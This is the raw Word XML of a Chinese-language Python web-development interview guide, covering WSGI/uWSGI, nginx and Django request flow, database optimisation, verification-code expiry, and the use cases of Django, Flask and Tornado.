    <w:p w14:paraId="4BAEF234" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="334" w:name="7989-1535453385926"/>
      <w:bookmarkEnd w:id="334"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>要注意 WSGI / uwsgi / uWSGI 这三个概念的区分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118E9FF7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="335" w:name="5814-1535453385926"/>
      <w:bookmarkEnd w:id="335"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGI 是一种通信协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279B8FDD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="336" w:name="7095-1535453385926"/>
      <w:bookmarkEnd w:id="336"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uwsgi 是一种线路协议而不是通信协议，在此常用于在 uWSGI 服务器与其他网络服务器的数据通信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EACF8E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="337" w:name="2476-1535453385926"/>
      <w:bookmarkEnd w:id="337"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uWSGI 是实现了 uwsgi 和 WSGI 两种协议的 Web 服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C292BE3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="338" w:name="7410-1535453385926"/>
      <w:bookmarkEnd w:id="338"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）nginx 是一个开源的高性能的 HTTP 服务器和反向代理：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0285913D" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="339" w:name="4337-1535453385926"/>
      <w:bookmarkEnd w:id="339"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1.作为 web 服务器，它处理静态文件和索引文件效果非常高；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592188AE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="340" w:name="5020-1535453385926"/>
      <w:bookmarkEnd w:id="340"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2.它的设计非常注重效率，最大支持 5 万个并发连接，但只占用很少的内存空间；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76856BE7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="341" w:name="1780-1535453385926"/>
      <w:bookmarkEnd w:id="341"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3.稳定性高，配置简洁；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778974F3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="342" w:name="8014-1535453385926"/>
      <w:bookmarkEnd w:id="342"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4.强大的反向代理和负载均衡功能，平衡集群中各个服务器的负载压力应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F588E2D" w14:textId="5FC38C05" w:rsidR="001C47AF" w:rsidRDefault="003547BF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="343" w:name="2512-1535453484816"/>
      <w:bookmarkStart w:id="344" w:name="1062-1535453481224"/>
      <w:bookmarkEnd w:id="343"/>
      <w:bookmarkEnd w:id="344"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>007</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nginx </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> uWISG </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>服务器之间如何配合工作的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335356F3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="345" w:name="3130-1535452670754"/>
      <w:bookmarkEnd w:id="345"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>首先浏览器发起 http 请求到 nginx 服务，Nginx 根据接收到请求包，进行 url 分析，判断访问的资源类型，如果是静态资源，直接读取静态资源返回给浏览，如果请求的是动态资源就转交给 uwsgi 服务器，uwsgi 服务器根据自身的 uwsgi 和 WSGI 协议，找到对应的 Django 框架，Django 框架下的应用进行逻辑处理后，将返回值发送到 uwsgi 服务器，然后 uwsgi 服务器再返回给 nginx，最后 nginx 将返回值返回给浏览器进行渲染显示给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3B72D5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="346" w:name="2962-1535453495850"/>
      <w:bookmarkEnd w:id="346"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（如果可以，画图讲解效果更佳，可以 将下面的图画给面试官。）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B124F4" w14:textId="54587E0A" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="347" w:name="6528-1535453509773"/>
      <w:bookmarkEnd w:id="347"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C18AFC7" wp14:editId="2B9A2A60">
            <wp:extent cx="5305425" cy="265747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05425" cy="2657475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E37ABC" w14:textId="74100E01"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48" w:name="2679-1535453509773"/>
      <w:bookmarkStart w:id="349" w:name="3919-1535453525932"/>
      <w:bookmarkEnd w:id="348"/>
      <w:bookmarkEnd w:id="349"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>008</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开发中数据库做过什么优化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E84CD2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="350" w:name="4575-1535453540520"/>
      <w:bookmarkEnd w:id="350"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）设计表时，尽量少使用外键，因为外键约束会影响插入和删除性能；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD7FBEA" w14:textId="0136762B" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="351" w:name="7096-1535453541613"/>
      <w:bookmarkEnd w:id="351"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）使用缓存，减少对数据库的访问；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E821F0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="352" w:name="6320-1535453553560"/>
      <w:bookmarkEnd w:id="352"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）在 orm 框架下设置表时，能用 varchar 确定字段长度时，就别用 text；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6ADD9C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="353" w:name="5858-1535453541613"/>
      <w:bookmarkEnd w:id="353"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）可以给搜索频率高的字段属性，在定义时创建索引；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C49951" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="354" w:name="5771-1535453576059"/>
      <w:bookmarkEnd w:id="354"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）Django orm 框架下的 Querysets 本来就有缓存的；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3A84C7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="355" w:name="6148-1535453541613"/>
      <w:bookmarkEnd w:id="355"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（6）如果一个页面需要多次连接数据库，最好一次性取出所有需要的数据，减少对数据库的查询次数；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1604A3A8" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="356" w:name="2968-1535453541613"/>
      <w:bookmarkEnd w:id="356"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（7）若页面只需要数据库里某一个两个字段时，可以用 QuerySet.values()；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0723F2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="357" w:name="8523-1535453541613"/>
      <w:bookmarkEnd w:id="357"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（8）在模板标签里使用 with 标签可以缓存 Qset 的查询结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFAD26E" w14:textId="58944C14"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58" w:name="9327-1535453614310"/>
      <w:bookmarkStart w:id="359" w:name="1957-1535453600479"/>
      <w:bookmarkEnd w:id="358"/>
      <w:bookmarkEnd w:id="359"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>009</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验证码过期时间怎么设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1067A5CC" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="360" w:name="7046-1535453628338"/>
      <w:bookmarkEnd w:id="360"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将验证码保存到数据库或 session，设置过期时间为 1 分钟，然后页面设置一个倒计时(一般是前端js 实现这个计时)的展示，一分钟过后再次点击获取新的信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735042DF" w14:textId="6F13FDEC"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61" w:name="3940-1535453701958"/>
      <w:bookmarkStart w:id="362" w:name="2125-1535453600655"/>
      <w:bookmarkEnd w:id="361"/>
      <w:bookmarkEnd w:id="362"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>010</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Python </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中三大框架各自的应用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692254F4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="363" w:name="6370-1535453600841"/>
      <w:bookmarkEnd w:id="363"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6521FCDD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="364" w:name="9259-1535453728093"/>
      <w:bookmarkEnd w:id="364"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>主要是用来搞快速开发的，他的亮点就是快速开发，节约成本，正常的并发量不过 10000， 如果要实现高并发的话，就要对 django 进行二次开发，比如把整个笨重的框架给拆掉，自己写 socket 实现 http 的通信，底层用纯 c，c++写提升效率，ORM 框架给干掉，自己编写封装与数据库交互的框架，因为啥呢，ORM 虽然面向对象来操作数据库，但是它的效率很低，使用外键来联系表与表之间的查询；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EE9D86" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="365" w:name="1713-1535453716106"/>
      <w:bookmarkEnd w:id="365"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>flask：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541E0574" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="366" w:name="1022-1535453733465"/>
      <w:bookmarkEnd w:id="366"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>轻量级，主要是用来写接口的一个框架，实现前后端分离，提升开发效率，Flask 本身相当于一个内核，其他几乎所有的功能都要用到扩展（邮件扩展 Flask-Mail，用户认证 Flask-Login），都需要用第三方的扩展来实现。比如可以用 Flask-extension 加入 ORM、窗体验证工具，文件上传、身份验证等。Flask 没有默认使用的数据库，你可以选择 MySQL，也可以用 NoSQL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC422F0" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="367" w:name="1524-1535453716106"/>
      <w:bookmarkEnd w:id="367"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其 WSGI 工具箱采用 Werkzeug（路由模块），模板引擎则使用  Jinja2。这两个也是 Flask 框架的核心。Python 最出名的框架要数 Django，此外还有 Flask、Tornado 等框架。虽然 Flask 不是最出名的框架，但是 Flask 应该算是最灵活的框架之一，这也是 Flask 受到广大开发者喜爱的原因。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657D04F6" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="368" w:name="7246-1535453752531"/>
      <w:bookmarkEnd w:id="368"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Tornado：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08343EEB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="369" w:name="9963-1535453755600"/>
      <w:bookmarkEnd w:id="369"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> Tornado 是一种 Web 服务器软件的开源版本。Tornado  和现在的主流  Web  服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575E5FE9" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="370" w:name="9091-1535453716106"/>
      <w:bookmarkEnd w:id="370"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>得利于其非阻塞的方式和对 epoll 的运用，Tornado  每秒可以处理数以千计的连接，因此  Tornado是实时 Web 服务的一个 理想框架。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9263BB" w14:textId="34540DAF"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71" w:name="2984-1535453786230"/>
